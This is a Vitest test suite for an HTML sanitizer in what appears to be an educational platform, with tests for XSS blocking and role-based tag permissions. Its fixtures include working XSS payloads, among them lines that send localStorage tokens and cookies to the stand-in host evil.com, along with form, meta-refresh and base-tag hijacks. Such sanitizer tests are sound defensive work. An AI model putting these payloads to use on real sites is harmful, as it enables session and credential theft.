import { describe, it, expect, beforeEach } from 'vitest';
import { sanitizeHTML } from './useSanitizedHTML';

/**
 * Test suite for HTML sanitization hook
 * Tests XSS prevention (GLIT-SEC-005, CWE-79, CVSS 6.9)
 */
describe('useSanitizedHTML - XSS Prevention', () => {
  describe('Script Injection Prevention', () => {
    it('should remove script tags', () => {
      const malicious = '<p>Hello</p><script>alert("XSS")</script>';
      const result = sanitizeHTML(malicious);
      expect(result).not.toContain('<script');
      expect(result).not.toContain('alert');
      expect(result).toContain('Hello');
    });

    it('should remove inline event handlers', () => {
      const malicious = '<img src="x" onerror="alert(\'XSS\')" />';
      const result = sanitizeHTML(malicious);
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('alert');
    });

    it('should remove onclick handlers', () => {
      const malicious = '<button onclick="stealToken()">Click me</button>';
      const result = sanitizeHTML(malicious);
      expect(result).not.toContain('onclick');
      expect(result).not.toContain('stealToken');
    });

    it('should remove onload handlers', () => {
      const malicious = '<body onload="maliciousCode()">';
      const result = sanitizeHTML(malicious);
      expect(result).not.toContain('onload');
      expect(result).not.toContain('maliciousCode');
    });

    it('should remove onmouseover handlers', () => {
      const malicious = '<div onmouseover="steal()">Hover me</div>';
      const result = sanitizeHTML(malicious);
      expect(result).not.toContain('onmouseover');
      expect(result).not.toContain('steal');
    });
  });

  describe('Token Theft Prevention', () => {
    it('should remove javascript: protocol in links', () => {
      const malicious = '<a href="javascript:void(localStorage.clear())">Click</a>';
      const result = sanitizeHTML(malicious);
      expect(result).not.toContain('javascript:');
      expect(result).not.toContain('localStorage');
    });

    it('should neutralize data: URIs to prevent execution', () => {
      const malicious = '<img src="data:text/html,<script>alert(1)</script>" />';
      const result = sanitizeHTML(malicious);

      // The key security check: ensure no actual <script> tag exists in the DOM
      // (the text in the src attribute is not executable, just a string)
      const tempDiv = document.createElement('div');
      tempDiv.innerHTML = result;
      const scriptTags = tempDiv.querySelectorAll('script');

      expect(scriptTags.length).toBe(0);
      expect(tempDiv.textContent).not.toContain('alert(1)');
    });

    it('should block vbscript: protocol', () => {
      const malicious = '<a href="vbscript:msgbox">Click</a>';
      const result = sanitizeHTML(malicious);
      expect(result).not.toContain('vbscript:');
    });
  });

  describe('DOM Clobbering Prevention', () => {
    it('should sanitize DOM to prevent clobbering attacks', () => {
      const malicious = '<form name="document"><input name="cookie"></form>';
      const result = sanitizeHTML(malicious, { role: 'student' });
      // Students shouldn't have form tags
      expect(result).not.toContain('<form');
    });

    it('should remove dangerous object/embed tags', () => {
      const malicious = '<object data="malicious.swf"></object>';
      const result = sanitizeHTML(malicious);
      expect(result).not.toContain('<object');
    });

    it('should remove embed tags', () => {
      const malicious = '<embed src="malicious.swf" />';
      const result = sanitizeHTML(malicious);
      expect(result).not.toContain('<embed');
    });
  });

  describe('Role-based Permissions', () => {
    const educationalContent = `
      <h2>Lesson Title</h2>
      <p>This is a <strong>lesson</strong> with <a href="https://example.com">a link</a>.</p>
      <img src="https://example.com/image.jpg" alt="Educational" />
      <iframe src="https://www.youtube.com/embed/abc123"></iframe>
      <code>const x = 1;</code>
    `;

    it('student role should only allow basic formatting', () => {
      const result = sanitizeHTML(educationalContent, { role: 'student' });

      // Should keep basic formatting
      expect(result).toContain('<p>');
      expect(result).toContain('<strong>');
      expect(result).toContain('<code>');

      // Should remove advanced elements
      expect(result).not.toContain('<h2>');
      expect(result).not.toContain('<a ');
      expect(result).not.toContain('<img');
      expect(result).not.toContain('<iframe');
    });

    it('teacher role should allow educational content but no iframes', () => {
      const result = sanitizeHTML(educationalContent, { role: 'teacher' });

      // Should keep educational elements
      expect(result).toContain('<h2>');
      expect(result).toContain('<a ');
      expect(result).toContain('<img');

      // Should remove iframes
      expect(result).not.toContain('<iframe');
    });

    it('admin role should allow full educational content', () => {
      const result = sanitizeHTML(educationalContent, { role: 'admin' });

      // Should keep all educational elements
      expect(result).toContain('<h2>');
      expect(result).toContain('<a ');
      expect(result).toContain('<img');
      expect(result).toContain('<iframe');
    });
  });

  describe('External Link Safety', () => {
    it('should preserve safe HTTPS links', () => {
      const safe = '<a href="https://example.com">Link</a>';
      const result = sanitizeHTML(safe, { role: 'admin' });
      expect(result).toContain('https://example.com');
    });

    it('should preserve safe HTTP links', () => {
      const safe = '<a href="http://example.com">Link</a>';
      const result = sanitizeHTML(safe, { role: 'admin' });
      expect(result).toContain('http://example.com');
    });

    it('should preserve mailto links', () => {
      const safe = '<a href="mailto:test@example.com">Email</a>';
      const result = sanitizeHTML(safe, { role: 'admin' });
      expect(result).toContain('mailto:');
    });
  });

  describe('Content Preservation', () => {
    it('should preserve legitimate HTML content', () => {
      const legitimate = `
        <h1>Exercise Instructions</h1>
        <p>Complete the following tasks:</p>
        <ol>
          <li>Read the <strong>documentation</strong></li>
          <li>Write <em>clean code</em></li>
          <li>Run the <code>tests</code></li>
        </ol>
        <blockquote>Remember: Quality over quantity!</blockquote>
      `;

      const result = sanitizeHTML(legitimate, { role: 'admin' });

      expect(result).toContain('<h1>');
      expect(result).toContain('<p>');
      expect(result).toContain('<ol>');
      expect(result).toContain('<li>');
      expect(result).toContain('<strong>');
      expect(result).toContain('<em>');
      expect(result).toContain('<code>');
      expect(result).toContain('<blockquote>');
      expect(result).toContain('Exercise Instructions');
      expect(result).toContain('documentation');
    });

    it('should preserve code blocks', () => {
      const code = '<pre><code>function test() { return true; }</code></pre>';
      const result = sanitizeHTML(code);
      expect(result).toContain('<pre>');
      expect(result).toContain('<code>');
      expect(result).toContain('function test()');
    });

    it('should preserve tables for admin/teacher', () => {
      const table = `
        <table>
          <thead><tr><th>Name</th><th>Score</th></tr></thead>
          <tbody><tr><td>Alice</td><td>100</td></tr></tbody>
        </table>
      `;
      const result = sanitizeHTML(table, { role: 'teacher' });
      expect(result).toContain('<table>');
      expect(result).toContain('<thead>');
      expect(result).toContain('<tbody>');
      expect(result).toContain('<th>');
      expect(result).toContain('<td>');
    });
  });

  describe('Edge Cases', () => {
    it('should handle empty string', () => {
      const result = sanitizeHTML('');
      expect(result).toBe('');
    });

    it('should handle plain text', () => {
      const text = 'Just plain text';
      const result = sanitizeHTML(text);
      expect(result).toBe(text);
    });

    it('should handle malformed HTML', () => {
      const malformed = '<p>Unclosed paragraph<div>Nested wrong</p></div>';
      const result = sanitizeHTML(malformed);
      // Should still sanitize and attempt to fix structure
      expect(result).toBeTruthy();
      expect(result).not.toContain('<script');
    });

    it('should handle nested XSS attempts', () => {
      const nested = '<div><p><span><script>alert("nested")</script></span></p></div>';
      const result = sanitizeHTML(nested);
      expect(result).not.toContain('<script');
      expect(result).not.toContain('alert');
    });

    it('should handle encoded XSS attempts', () => {
      const encoded = '&lt;script&gt;alert("encoded")&lt;/script&gt;';
      const result = sanitizeHTML(encoded);
      // Should keep as text, not execute
      expect(result).not.toContain('<script>');
    });
  });

  describe('Real-world Attack Vectors', () => {
    it('should block localStorage theft attempt', () => {
      const attack = '<img src=x onerror="fetch(\'https://evil.com?token=\'+localStorage.getItem(\'token\'))" />';
      const result = sanitizeHTML(attack);
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('localStorage');
      expect(result).not.toContain('fetch');
      expect(result).not.toContain('evil.com');
    });

    it('should block cookie theft attempt', () => {
      const attack = '<script>document.location="https://evil.com?c="+document.cookie</script>';
      const result = sanitizeHTML(attack);
      expect(result).not.toContain('<script');
      expect(result).not.toContain('document.cookie');
      expect(result).not.toContain('evil.com');
    });

    it('should block form injection', () => {
      const attack = '<form action="https://evil.com"><input name="password" /></form>';
      const result = sanitizeHTML(attack, { role: 'student' });
      expect(result).not.toContain('<form');
      expect(result).not.toContain('evil.com');
    });

    it('should block SVG-based XSS', () => {
      const attack = '<svg onload="alert(1)"></svg>';
      const result = sanitizeHTML(attack);
      expect(result).not.toContain('onload');
      expect(result).not.toContain('alert');
    });

    it('should block meta refresh redirects', () => {
      const attack = '<meta http-equiv="refresh" content="0;url=https://evil.com" />';
      const result = sanitizeHTML(attack);
      expect(result).not.toContain('<meta');
      expect(result).not.toContain('evil.com');
    });

    it('should block base tag hijacking', () => {
      const attack = '<base href="https://evil.com/" />';
      const result = sanitizeHTML(attack);
      expect(result).not.toContain('<base');
    });
  });

  describe('Performance', () => {
    it('should handle large content efficiently', () => {
      const largeContent = '<p>' + 'Lorem ipsum '.repeat(1000) + '</p>';
      const startTime = performance.now();
      const result = sanitizeHTML(largeContent);
      const endTime = performance.now();

      expect(result).toBeTruthy();
      expect(endTime - startTime).toBeLessThan(100); // Should complete in < 100ms
    });
  });

  describe('Additional Allowed Tags/Attrs', () => {
    it('should allow additional tags when specified', () => {
      const content = '<article>Custom content</article>';
      const result = sanitizeHTML(content, {
        role: 'student',
        additionalAllowedTags: ['article']
      });
      expect(result).toContain('<article>');
    });

    it('should allow additional attributes when specified', () => {
      const content = '<div data-custom="value">Content</div>';
      const result = sanitizeHTML(content, {
        role: 'admin',
        additionalAllowedAttrs: ['data-custom']
      });
      expect(result).toContain('data-custom');
    });
  });
});
